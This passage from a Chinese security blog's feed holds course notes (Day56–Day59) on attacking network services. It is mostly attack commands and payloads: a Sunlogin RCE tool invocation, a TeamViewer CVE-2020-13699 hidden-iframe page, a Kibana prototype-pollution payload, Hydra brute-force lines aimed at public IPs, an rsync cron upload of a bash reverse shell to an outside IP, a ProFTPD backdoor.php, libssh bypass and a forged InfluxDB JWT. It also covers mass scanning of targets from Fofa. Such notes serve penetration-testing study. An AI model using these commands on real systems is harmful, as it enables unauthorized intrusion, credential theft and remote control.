src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312134305627.png" alt="image-20230312134305627"></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;中间件及框架列表：&lt;/p&gt;
&lt;p&gt;IIS，Apache，Nginx，Tomcat，Docker，Weblogic，JBo</summary>
      
    
    
    
    <category term="服务攻防" scheme="http://example.com/categories/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day58 服务攻防-应用协议&amp;设备Kibana&amp;Zabbix&amp;远控向日葵&amp;VNC&amp;TV</title>
    <link href="http://example.com/2023/03/11/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/"/>
    <id>http://example.com/2023/03/11/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/</id>
    <published>2023-03-11T02:22:27.000Z</published>
    <updated>2023-03-11T17:05:11.728Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、远程控制-第三方应用安全</p><p>2、三方应用-向日葵&amp;VNC&amp;TV</p><p>3、设备平台-Zabbix&amp;Kibana漏洞</p><h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>常见服务应用的安全测试：</p><p>1、配置不当-未授权访问</p><p>2、安全机制-特定安全漏洞</p><p>3、安全机制-弱口令爆破攻击</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>应用服务安全测试流程：见图</p><p>1、判断服务开放情况-端口扫描&amp;组合应用等</p><p>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等</p><p>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 远程控制-向日葵&amp;Vnc&amp;Teamviewer</p><p>➢ 设备平台-Zabbix-CVE-2022-23131</p><p>➢ 设备平台-Kibana-CVE-2019-7609</p><h4 id="远程控制-向日葵-amp-Vnc-amp-Teamviewer"><a href="#远程控制-向日葵-amp-Vnc-amp-Teamviewer" class="headerlink" title="#远程控制-向日葵&amp;Vnc&amp;Teamviewer"></a>#远程控制-向日葵&amp;Vnc&amp;Teamviewer</h4><h6 id="向日葵-RCE"><a href="#向日葵-RCE" class="headerlink" title="-向日葵 RCE"></a>-向日葵 RCE</h6><p><a href="https://github.com/Mr-xn/sunlogin_rce">https://github.com/Mr-xn/sunlogin_rce</a></p><p>xrkRce.exe -h 192.168.46.157 -t scan</p><p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230311183849961.png" alt="image-20230311183849961"></p><p>xrkRce.exe -h 192.168.46.157 -t rce -p 49712 -c “ipconfig”</p><p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230311183909511.png" alt="image-20230311183909511"></p><h6 id="Teamviewer"><a href="#Teamviewer" class="headerlink" title="-Teamviewer"></a>-Teamviewer</h6><p>复现漏洞：(<a href="https://blog.csdn.net/qq_43233085/article/details/107997220">https://blog.csdn.net/qq_43233085/article/details/107997220</a>)</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">​    <span class="tag">&lt;<span class="name">title</span>&gt;</span>cve-2020-13699<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Welcome to xiaodi!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">&quot;height:1px;width:1px;&quot;</span> <span class="attr">src</span>=<span class="string">&#x27;teamviewer10: --play \\attacker-IP\share\fake.tvs&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h6 id="VNC-口令问题-amp-未授权"><a href="#VNC-口令问题-amp-未授权" class="headerlink" title="-VNC 口令问题&amp;未授权"></a>-VNC 口令问题&amp;未授权</h6><p>MSF内置口令及未授权测试</p><p>复现链接：(<a href="https://blog.csdn.net/weixin_40412037/article/details/120437843">https://blog.csdn.net/weixin_40412037/article/details/120437843</a>)</p><h4 id="设备平台-Zabbix-CVE-2022-23131"><a href="#设备平台-Zabbix-CVE-2022-23131" class="headerlink" title="#设备平台-Zabbix-CVE-2022-23131"></a>#设备平台-Zabbix-CVE-2022-23131</h4><p>Zabbix 是由Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。是一款服务器监控软件，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。默认端口：10051</p><p>复现链接：(<a href="https://blog.csdn.net/weixin_50464560/article/details/123154050">https://blog.csdn.net/weixin_50464560/article/details/123154050</a>)</p><p>Zabbix CVE-2022-23131 登录绕过漏洞复现</p><p>脚本：<a href="https://github.com/L0ading-x/cve-2022-23131">https://github.com/L0ading-x/cve-2022-23131</a></p><p>执行：python3 zabbix.py target Admin</p><p>然后修改Cookie，使用saml登录即可</p><p>CVE-2017-2824 CVE-2020-11800（这两个没有什么价值）</p><h4 id="设备平台-Kibana-CVE-2019-7609"><a href="#设备平台-Kibana-CVE-2019-7609" class="headerlink" title="#设备平台-Kibana-CVE-2019-7609"></a>#设备平台-Kibana-CVE-2019-7609</h4><p>Kibana为Elassticsearch设计的一款开源的视图工具。其5.6.15和6.6.1之前的版本中存在一处原型链污染漏洞，利用漏洞可以在目标服务器上执行任意代码。默认端口：5601</p><p><a href="https://github.com/LandGrey/CVE-2019-7609">https://github.com/LandGrey/CVE-2019-7609</a></p><p>用脚本抽选一个测试，发现失败</p><p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230312004809566.png" alt="image-20230312004809566"></p><p>用FofaViewer批量化操作，复制到ips.txt里面置于脚本目录下</p><p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230312005005975.png" alt="image-20230312005005975"></p><p>编写批量化脚本，先试着打印出ips的内容</p><p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230312005110129.png" alt="image-20230312005110129"></p><p>但是每个ip间都有空格</p><p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230312005158117.png" alt="image-20230312005158117"></p><p>去掉空行</p><p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230312005253941.png" alt="image-20230312005253941"></p><p>完整代码执行实现批量扫（脚本都在同一目录下）</p><p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230312005444474.png" alt="image-20230312005444474"></p><p>.es(*).props(label.<strong>proto</strong>.env.AAAA&#x3D;’require(“child_process”).exec(“&#x2F;bin&#x2F;touch &#x2F;tmp&#x2F;success”);process.exit()&#x2F;&#x2F;‘) .props(label.<strong>proto</strong>.env.NODE_OPTIONS&#x3D;’–require &#x2F;proc&#x2F;self&#x2F;environ’)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、远程控制-第三方应用安全&lt;/p&gt;
&lt;p&gt;2、三方应用-向日葵&amp;amp;VNC&amp;amp;TV&lt;/p&gt;
&lt;p&gt;3、设备平</summary>
      
    
    
    
    <category term="服务攻防" scheme="http://example.com/categories/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day57 服务攻防-应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批扫&amp;口令猜解</title>
    <link href="http://example.com/2023/03/11/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/"/>
    <id>http://example.com/2023/03/11/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/</id>
    <published>2023-03-11T02:22:08.000Z</published>
    <updated>2023-03-11T08:30:25.981Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、服务攻防-远程控制&amp;文件传输等</p><p>2、远程控制-RDP&amp;RDP&amp;弱口令&amp;漏洞</p><p>3、文件传输-FTP&amp;Rsync&amp;弱口令&amp;漏洞</p><h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>常见服务应用的安全测试：</p><p>1、配置不当-未授权访问</p><p>2、安全机制-特定安全漏洞</p><p>3、安全机制-弱口令爆破攻击</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>应用服务安全测试流程：见图</p><p>1、判断服务开放情况-端口扫描&amp;组合应用等</p><p>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等</p><p>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 口令猜解-Hydra-FTP&amp;RDP&amp;SSH</p><p>➢ 配置不当-未授权访问-Rsync文件备份</p><p>➢ 高端课程-直接搜哈-MSF&amp;Fofaviewer</p><p>➢ 协议漏洞-应用软件-FTP&amp;Proftpd搭建</p><p>➢ 协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh</p><h4 id="口令猜解-Hydra-FTP-amp-RDP-amp-SSH"><a href="#口令猜解-Hydra-FTP-amp-RDP-amp-SSH" class="headerlink" title="#口令猜解-Hydra-FTP&amp;RDP&amp;SSH"></a>#口令猜解-Hydra-FTP&amp;RDP&amp;SSH</h4><p><a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></p><p>hydra是一个自动化的爆破工具，暴力破解弱密码，</p><p>是一个支持众多协议的爆破工具，已经集成到KaliLinux中，直接在终端打开即可</p><p>-s PORT 可通过这个参数指定非默认端口。</p><p>-l LOGIN 指定破解的用户，对特定用户破解。</p><p>-L FILE 指定用户名字典。</p><p>-p PASS 小写，指定密码破解，少用，一般是采用密码字典。</p><p>-P FILE 大写，指定密码字典。</p><p>-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。</p><p>-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L&#x2F;-P参数。</p><p>-M FILE 指定目标列表文件一行一条。</p><p>-o FILE 指定结果输出文件。</p><p>-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。</p><p>-t TASKS 同时运行的线程数，默认为16。</p><p>-w TIME 设置最大超时的时间，单位秒，默认是30s。</p><p>-v &#x2F; -V 显示详细过程。</p><p>server 目标ip</p><p>service 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等。</p><p>例子：</p><p>FTP：文件传输协议</p><p>RDP：Windows远程桌面协议</p><p>SSH：Linux安全外壳协议</p><p>hydra -L test -P 10top1K.txt 47.110.53.159 ftp -V</p><p>hydra -l root -P 10top1K.txt 47.110.53.159 ssh -V</p><p>hydra -l administrator -P 10top1K.txt 47.110.53.159 rdp -V</p><h4 id="配置不当-未授权访问-Rsync文件备份"><a href="#配置不当-未授权访问-Rsync文件备份" class="headerlink" title="#配置不当-未授权访问-Rsync文件备份"></a>#配置不当-未授权访问-Rsync文件备份</h4><p>rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。</p><p>判断：rsync rsync:&#x2F;&#x2F;123.58.236.76:12155&#x2F;</p><p>存在漏洞</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311144602138.png" alt="image-20230311144602138"></p><p>利用：</p><p>-读取文件：rsync rsync:&#x2F;&#x2F;123.58.236.76:45854&#x2F;src&#x2F;</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311144927269.png" alt="image-20230311144927269"></p><p>-下载文件：rsync -av rsync:&#x2F;&#x2F;123.58.236.76:45854&#x2F;src&#x2F;etc&#x2F;passwd .&#x2F;</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311144911642.png" alt="image-20230311144911642"></p><p>-上传文件：rsync -av passwd rsync:&#x2F;&#x2F;123.58.236.76:45854&#x2F;src&#x2F;tmp&#x2F;passwd</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311145102157.png" alt="image-20230311145102157"></p><p>反弹shell：（把文件传到其计时任务，当计时任务到达就会执行）</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311145314694.png" alt="image-20230311145314694"></p><p>1、获取crontab配置文件信息</p><p>查看crontab配置文件：rsync rsync:&#x2F;&#x2F;192.168.91.130&#x2F;src&#x2F;etc&#x2F;crontab</p><p>下载crontab配置文件：rsync -av rsync:&#x2F;&#x2F;192.168.91.130&#x2F;src&#x2F;etc&#x2F;crontab &#x2F;root&#x2F;cron.txt</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311150722053.png" alt="image-20230311150722053"></p><p>查看内容：cat &#x2F;root&#x2F;cron.txt</p><p>其中的17 * * * * root cd &#x2F; &amp;&amp; run-parts –report &#x2F;etc&#x2F;cron.hourly表示在每小时的第17分钟执行run-parts –report &#x2F;etc&#x2F;cron.hourly命令</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311150341236.png" alt="image-20230311150341236"></p><p>2.创建文件 </p><p>touch shell </p><p>vim shell 写入以下内容</p><p>&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.94.236.117&#x2F;5566 0&gt;&amp;1</p><p>chmod +x shell给文件赋予执行权限</p><p>3、上传文件 </p><p>上传：rsync -av shell rsync:&#x2F;&#x2F;123.58.236.76:12177&#x2F;src&#x2F;etc&#x2F;cron.hourly </p><p>查看是否上传了：rsync rsync:&#x2F;&#x2F;123.58.236.76:45854&#x2F;src&#x2F;etc</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311151451468.png" alt="image-20230311151451468"></p><p>4、等待接受反弹</p><h4 id="高端课程-直接搜哈-MSF-amp-Fofaviewer"><a href="#高端课程-直接搜哈-MSF-amp-Fofaviewer" class="headerlink" title="#高端课程-直接搜哈-MSF&amp;Fofaviewer"></a>#高端课程-直接搜哈-MSF&amp;Fofaviewer</h4><p><a href="https://github.com/wgpsec/fofa_viewer">https://github.com/wgpsec/fofa_viewer</a></p><p>msfconsole</p><p>use auxiliary&#x2F;scanner&#x2F;rsync&#x2F;modules_list</p><p>set rhosts file:&#x2F;root&#x2F;ips.txt</p><p>set threads 10</p><p>run</p><h4 id="协议漏洞-应用软件-FTP-amp-Proftpd搭建"><a href="#协议漏洞-应用软件-FTP-amp-Proftpd搭建" class="headerlink" title="#协议漏洞-应用软件-FTP&amp;Proftpd搭建"></a>#协议漏洞-应用软件-FTP&amp;Proftpd搭建</h4><p><a href="https://github.com/t0kx/exploit-CVE-2015-3306">https://github.com/t0kx/exploit-CVE-2015-3306</a></p><p>python exploit.py –host 123.58.236.76 –port 24967 –path “&#x2F;var&#x2F;www&#x2F;html&#x2F;“</p><p><a href="http://123.58.236.76:19758/backdoor.php?cmd=id">http://123.58.236.76:19758/backdoor.php?cmd=id</a></p><h4 id="协议漏洞-应用软件-SSH-amp-libssh-amp-Openssh"><a href="#协议漏洞-应用软件-SSH-amp-libssh-amp-Openssh" class="headerlink" title="#协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh"></a>#协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh</h4><p>-Openssh CVE-2014-0160 CVE-2018-15473 cve_2020_15778</p><p>CVE-2014-0160 版本很少</p><p>cve_2020_15778 价值不高</p><p>CVE-2018-15473-用户名枚举</p><p><a href="https://github.com/Rhynorater/CVE-2018-15473-Exploit">https://github.com/Rhynorater/CVE-2018-15473-Exploit</a></p><p>pip3 install -r requirements.txt</p><p>pip3 install paramiko&#x3D;&#x3D;2.4.1</p><p>python sshUsernameEnumExploit.py –port 32013 –userList exampleInput.txt 123.58.236.76</p><p>-libssh 身份验证绕过（CVE-2018-10933）</p><p><a href="https://www.seebug.org/vuldb/ssvid-97614">https://www.seebug.org/vuldb/ssvid-97614</a></p><p>python libssh.py 123.58.236.76 55190 “id”</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311162430116.png" alt="image-20230311162430116"></p><p>下载exp执行</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311162657726.png" alt="image-20230311162657726"></p><p>执行whoami</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311162726290.png" alt="image-20230311162726290"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、服务攻防-远程控制&amp;amp;文件传输等&lt;/p&gt;
&lt;p&gt;2、远程控制-RDP&amp;amp;RDP&amp;amp;弱口令&amp;amp;</summary>
      
    
    
    
    <category term="服务攻防" scheme="http://example.com/categories/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day56 服务攻防-数据库安全&amp;H2&amp;Elasticsearch&amp;CouchDB&amp;Influxdb复现</title>
    <link href="http://example.com/2023/03/11/Day56-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-H2-Elasticsearch-CouchDB-Influxdb%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2023/03/11/Day56-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-H2-Elasticsearch-CouchDB-Influxdb%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-03-11T02:21:15.000Z</published>
    <updated>2023-03-11T05:08:44.619Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、服务攻防-数据库类型安全</p><p>2、influxdb-未授权访问-jwt验证</p><p>3、H2database-未授权访问-配置不当</p><p>4、CouchDB-权限绕过配合RCE-漏洞</p><p>5、ElasticSearch-文件写入&amp;RCE-漏洞</p><h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>常见服务应用的安全测试：</p><p>1、配置不当-未授权访问</p><p>2、安全机制-特定安全漏洞</p><p>3、安全机制-弱口令爆破攻击</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>应用服务安全测试流程：见图</p><p>1、判断服务开放情况-端口扫描&amp;组合应用等</p><p>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等</p><p>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ Influxdb-未授权访问-Jwt验证不当</p><p>➢ H2database-未授权访问-配置不当</p><p>➢ CouchDB-权限绕过配合RCE-漏洞</p><p>➢ ElasticSearch-文件写入&amp;RCE-漏洞</p><h4 id="Influxdb-未授权访问-Jwt验证不当"><a href="#Influxdb-未授权访问-Jwt验证不当" class="headerlink" title="#Influxdb-未授权访问-Jwt验证不当"></a>#Influxdb-未授权访问-Jwt验证不当</h4><p>复现链接：(<a href="https://blog.csdn.net/weixin_44037296/article/details/118754782">https://blog.csdn.net/weixin_44037296/article/details/118754782</a>)</p><p>默认端口：8086 8088</p><p>influxdb是一款著名的时序数据库，其使用jwt作为鉴权方式。在用户开启了认证，但未设置参数shared-secret的情况下，jwt的认证密钥为空字符串，此时攻击者可以伪造任意用户身份在influxdb中执行SQL语句。</p><p>漏洞复现：</p><p>靶场vulhub</p><p>1、借助<a href="https://jwt.io/%E6%9D%A5%E7%94%9F%E6%88%90jwt">https://jwt.io/来生成jwt</a> token，其中，<code>admin</code>是一个已经存在的用户，<code>exp</code>是一个时间戳，代表着这个token的过期时间，你需要设置为一个未来的时间戳</p><p>{</p><p>  “alg”: “HS256”,</p><p>  “typ”: “JWT”</p><p>}</p><p>{</p><p>  “username”: “admin”,</p><p>  “exp”: 1676346267</p><p>}</p><p><img src="/../images/Day56-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-H2-Elasticsearch-CouchDB-Influxdb%E5%A4%8D%E7%8E%B0/image-20230311115007574.png" alt="image-20230311115007574"></p><p>2、发送数据包触发未授权</p><p><code>POST /query HTTP/1.1</code><br><code>Host: your-ip</code><br><code>Accept-Encoding: gzip, deflate</code><br><code>Accept: */*</code><br><code>Accept-Language: en</code><br><code>Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc2MzQ2MjY3fQ.NPhb55F0tpsp5X5vcN_IkAAGDfNzV5BA6M4AThhxz6A</code><br><code>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</code><br><code>Connection: close</code><br><code>Content-Type: application/x-www-form-urlencoded</code></p><p><code>Content-Length: 22</code></p><p><code>db=sample&amp;q=show users</code></p><p>访问admin成功:</p><p><img src="/../images/Day56-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-H2-Elasticsearch-CouchDB-Influxdb%E5%A4%8D%E7%8E%B0/image-20230311115220726.png" alt="image-20230311115220726"></p><h4 id="H2database-未授权访问-配置不当"><a href="#H2database-未授权访问-配置不当" class="headerlink" title="#H2database-未授权访问-配置不当"></a>#H2database-未授权访问-配置不当</h4><p>复现链接：(<a href="https://blog.csdn.net/weixin_40602516/article/details/113265569">https://blog.csdn.net/weixin_40602516/article/details/113265569</a>)</p><p>默认端口：20051</p><p>H2 database是一款Java内存数据库，多用于单元测试。H2 